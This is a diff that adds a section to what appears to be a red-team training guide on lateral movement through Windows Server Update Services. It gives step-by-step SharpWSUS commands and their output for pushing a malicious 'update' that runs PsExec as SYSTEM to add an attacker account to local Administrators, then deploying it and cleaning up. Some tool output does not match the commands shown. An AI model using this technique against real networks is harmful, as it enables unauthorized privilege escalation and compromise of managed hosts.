@@ -2007,3 +2007,351 @@ From here, you can perform any desired action on the target server.
 
 ![windows lateral movement 14](../../../images/windows_lateral_movement14.png)
 
+## Windows Services
+
+### Windows Server Update Services (_WSUS_)
+
+is a Microsoft service that allows administrators to distribute updates and patches for Microsoft products throughout an environment in a scalable way. This solution enables internal servers to receive updates without direct internet access. WSUS is widely used in Windows corporate networks.
+
+#### Rights
+
+Access to the WSUS services requires administrative privileges on the server where the WSUS service is installed, meaning you need a user who is a member of either the `Administrator` or the `WSUS Administrator Group`. To effectively use WSUS service for lateral movement, the WSUS Server must be configured on the target to accept updates.
+
+#### Enum
+
+Before you leverage this service for lateral movement, you must identify if the WSUS Server is present. To get this information, you can query the registry key `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate`.
+
+```powershell
+PS C:\Tools> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+    WUServer    REG_SZ    http://wsus.inlanefreight.local:8530
+```
+
+The same can be achieved using [SharpWSUS](https://github.com/nettitude/SharpWSUS), which is a C# tool for lateral movement through WSUS. You can run `SharpWSUS.exe locate` to identify the WSUS server.
+
+```powershell
+PS C:\Tools> .\SharpWSUS.exe locate
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Locate WSUS Server
+WSUS Server: http://wsus.inlanefreight.local:8530
+
+[*] Locate complete
+```
+
+To conduct a deeper enum, you need to access the WSUS server. Once you get access to the WSUS server, you can execute `SharpWSUS.exe inspect`, and it will reveal information such as the computers managed by the WSUS server, the last update, check-in time for each computer, any Downstream Servers, and the WSUS groups.
+
+```
+c:\Tools> .\SharpWSUS.exe inspect
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Inspect WSUS Server
+
+################# WSUS Server Enumeration via SQL ##################
+ServerName, WSUSPortNumber, WSUSContentLocation
+-----------------------------------------------
+WSUS, 8530, C:\WSUS\WsusContent
+
+
+####################### Computer Enumeration #######################
+ComputerName, IPAddress, OSVersion, LastCheckInTime
+---------------------------------------------------
+sccm.inlanefreight.local, 172.20.0.25, 10.0.17763.2510, 6/26/2024 12:14:15 PM
+dc01.inlanefreight.local, 172.20.0.10, 10.0.17763.2510,
+srv01.inlanefreight.local, 172.20.0.51, 10.0.17763.2510,
+
+####################### Downstream Server Enumeration #######################
+ComputerName, OSVersion, LastCheckInTime
+---------------------------------------------------
+
+####################### Group Enumeration #######################
+GroupName
+---------------------------------------------------
+All Computers
+Downstream Servers
+Unassigned Computers
+
+[*] Inspect complete
+```
+
+> [!NOTE]
+> Make sure to execute `powershell.exe` as Administrator.
+
+#### Lateral Movement from Windows
+
+Once you have access to an account with rights on the WSUS server, either a member of the `Administrators` or `WSUS Administrators`, your task is to create a patch that will give you command execution on the target machine.
+
+##### SharpWSUS
+
+###### Create a Malicious Patch
+
+WSUS is restricted to executing only Microsoft-signed binaries. To craft genuine-looking but malicious path, you will utilize PSExec from Sysinternals, a signed Microsoft binary that allows you to execute commands.
+
+To create a new Windows update or malicious patch, you will use `SharpWSUS.exe create` as Administrator. You must specify the binary path to execute `/payload:<Path to binary>`, define the arguments for the payload with the option `/args` and optionally set the update title `/title:<Update title>`.
+
+To get command execution with PSExec, you will add your account to the Administrators group. To do that, you will use the following PSExec arguments. First you set `-accepteula` to avoid pop-ups, `-s` to run as system, `-d` to return immediately and the command to execute `net localgroup Administrators filiplain /add`:
+
+```
+c:\Tools> .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Create Update
+[*] Creating patch to use the following:
+[*] Payload: PSExec.exe
+[*] Payload Path: C:\Tools\sysinternals\PSExec.exe
+[*] Arguments: -accepteula -s -d cmd.exe /c 'net localgroup Administrators filiplain /add'
+[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;#39;net localgroup Administrators filiplain /add&amp;#39;
+
+################# WSUS Server Enumeration via SQL ##################
+ServerName, WSUSPortNumber, WSUSContentLocation
+-----------------------------------------------
+WSUS, 8530, C:\WSUS\WsusContent
+
+ImportUpdate
+Update Revision ID: 101472
+PrepareXMLtoClient
+InjectURL2Download
+DeploymentRevision
+PrepareBundle
+PrepareBundle Revision ID: 101473
+PrepareXMLBundletoClient
+DeploymentRevision
+
+[*] Update created - When ready to deploy use the following command:
+[*] SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN /groupname:"Group Name"
+
+[*] To check on the update status use the following command:
+[*] SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN
+
+[*] To delete the update use the following command:
+[*] SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN /groupname:"Group Name"
+
+[*] Create complete
+```
+
+The output above gave you three commands that you can execute to complete the Windows update process, which are approve, check, and delete.
+
+To see the results of your command in the WSUS Service, you can open `Windows Server Update Service` application to identify if your update got added into the server.
+
+![windows lateral movement 15](../../../images/windows_lateral_movement15.png)
+
+Move into the "Security Updates" and make sure that "Approval" is set to "Unapproved" and "Status" is "Any", and you will see the update you created with SharpWSUS named `NewAccountUpdate`:
+
+![windows lateral movement 16](../../../images/windows_lateral_movement16.png)
+
+###### Approve the Malicious Patch for Deployment with SharpWSUS
+
+To approve this malicious patch, you need to specify the computers which this patch will apply to and associate those computers with a group. You can achieve all this with SharpWSUS by using the command the previous output gave you. That output has the update ID that corresponds to the update you created, it is important to make sure that you are using the right update ID. You need to use `SharpWSUS.exe approve` with the option `/updateid:<Update ID>`, set the target computer with the option `/computername:<Target Computer>`, you are going to target SRV01, and finally set the new group to be created with the option `/groupname:<Group Name>`:
+
+```
+c:\Tools> .\SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local /groupname:"FastUpdates"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Approve Update
+
+Targeting srv02.inlanefreight.local
+TargetComputer, ComputerID, TargetID
+------------------------------------
+srv02.inlanefreight.local, d4e385a2-01e1-444f-b856-f857b8989b43, 1
+Group Exists = False
+Group Created: Hacker Group
+Added Computer To Group
+Approved Update
+
+[*] Approve complete
+```
+
+The tool will inform you if the group is already present before attempting to create it; if no other group exists with that name, the update will be approved and the group created. You can inspect again to confirm the WSUS groups:
+
+```
+c:\Tools> .\SharpWSUS.exe inspect
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Inspect WSUS Server
+
+... SNIP ...
+
+####################### Group Enumeration #######################
+GroupName
+---------------------------------------------------
+All Computers
+Downstream Servers
+FastUpdates
+Unassigned Computers
+
+[*] Inspect complete
+```
+
+###### Approve the Malicious Patch for Deployment Manually
+
+During your testing, sometimes, ShaprWSUS won't work to automatically approve the update. You also encounter some errors when uploading `PSExec64.exe` once the update is approved. See how you can do this process manually in case you have an error.
+
+Within the WSUS Service, navigate into "All Updates" and make sure that "Approval" is set to "Unapproved" and "Status" is "Any", and you will see the update you created with SharpWSUS named `NewAccountUpdate`.
+
+![windows lateral movement 17](../../../images/windows_lateral_movement17.png)
+
+Now, you need to right-click the update and click "approval" or you can go to the actions panel on the right and click "Approve...":
+
+![windows lateral movement 18](../../../images/windows_lateral_movement18.png)
+
+You need to select the group you want to apply this update to complete the approval. You will choose "All Computer" by right-clicking it, selecting "Approved for Install", and clicking "OK":
+
+![windows lateral movement 19](../../../images/windows_lateral_movement19.png)
+
+Next, you change the approval status to "Approved", make sure the "Status" is set to "Any", and confirm that everything is working.
+
+![windows lateral movement 20](../../../images/windows_lateral_movement20.png)
+
+There may be situations, commonly, when you attempt to perform this attack using only a WSUS Administrator account that is not a member of the WSUS Administrators group. When you approve the update, it will fail to download your PSExec64.exe file. As you can see in the following image:
+
+![windows lateral movement 21](../../../images/windows_lateral_movement21.png)
+
+To fix this error, you can copy the PSExec64.exe to the WSUScontent directory and rename the file as expected by the WSUS Service. To confirm what's the WSUScontent directory and the filename, you can use the Event Viewer. The WSUS Service will generate an event id 364 if the content file download failed. Use PowerShell to retrieve this event:
+
+```powershell
+PS C:\Tools> Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } |fl
+
+TimeCreated  : 7/3/2024 5:19:00 AM
+ProviderName : Windows Server Update Services
+Id           : 364
+Message      : Content file download failed.
+ Reason: HTTP status 404: The requested URL does not exist on the server.
+
+ Source File: /Content/wuagent.exe
+ Destination File: C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
+```
+
+You get the `Destination File`, now you need to copy PSExec64.exe to that location:
+
+```powershell
+PS C:\Tools> copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
+```
+
+Now, you go to the WSUS Service GUI, select the update with the error, and click "Retry Download". Once the server confirms the file exists. it will allow the download of your payload.
+
+![windows lateral movement 22](../../../images/windows_lateral_movement22.png)
+
+Ideally, if you copied PSExec64.exe into the `WsusContent` directory, it is recommended that you create another update with a different title but the same payload. This will help force the update quickly.
+
+> [!NOTE]
+> If updates approved by SharpWSUS.exe are not being installed, try creating a new update and approving it manually.
+
+###### Wait for the Client to Download the Patch
+
+The last thing you need to do is to wait for the target computer to install the new updates. You can verify if the installation was finalized by running `SharpWSUS.exe check`, specify the update id `/updateid:<Update ID>` and the target computer name `/computername:<Target Computer>`:
+
+```
+c:\Tools> .\SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Check Update
+
+Targeting srv01.inlanefreight.local
+TargetComputer, ComputerID, TargetID
+------------------------------------
+srv01.inlanefreight.local, bbc6e1ed-75ec-4eea-81cf-05da5c18e93e, 3
+
+Update Info cannot be found.
+
+[*] Check complete
+```
+
+The above output indicates that the computer hasn't completed the update process. You can force this process if you have access to the target computer by clicking "Check for Updates":
+
+![windows lateral movement 23](../../../images/windows_lateral_movement23.gif)
+
+You successfully installed your update. If you use `SharpWSUS.exe check` again, it will show that you successfully installed the update.
+
+You have successfully added a new member to the Administrator group of the target computer, you can now execute commands as an administrator.
+
+```
+c:\Tools> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+INLANEFREIGHT\Domain Admins
+INLANEFREIGHT\Filiplain
+INLANEFREIGHT\PDQ Deploy Admin
+The command completed successfully
+```
+
+###### Clean up after the Patch is downloaded
+
+To clean up everything about the malicious update running `SharpWSUS.exe delete`, specify the update id `/updateid:<Update ID>` and the target computer `/computername:<Target Computer>`.
+
+```
+c:\Tools> .\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv02.inlanefreight.local
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Delete Update
+
+[*] Update declined.
+
+
+[*] Update deleted.
+
+
+Targeting srv02.inlanefreight.local
+TargetComputer, ComputerID, TargetID
+------------------------------------
+srv02.inlanefreight.local, d4e385a2-01e1-444f-b856-f857b8989b43, 1
+Removed Computer From Group
+Remove Group
+
+[*] Delete complete
+```
+
+#### Alternative Tools for Abusing WSUS
+
+While SharpWSUS is a powerful tool for exploiting WSUS servers, other tools are available for similar purposes. [WSUSpendu](https://github.com/alex-dengx/WSUSpendu), a PowerShell tool, allows for the injection of malicious updates, forcing systems relying on the compromised WSUS server to execute arbitrary commands. Another option is [Thunder_Woosus](https://github.com/ThunderGunExpress/Thunder_Woosus), a C# tool designed for manipulating WSUS updates and enabling arbitrary command execution on targeted machines.
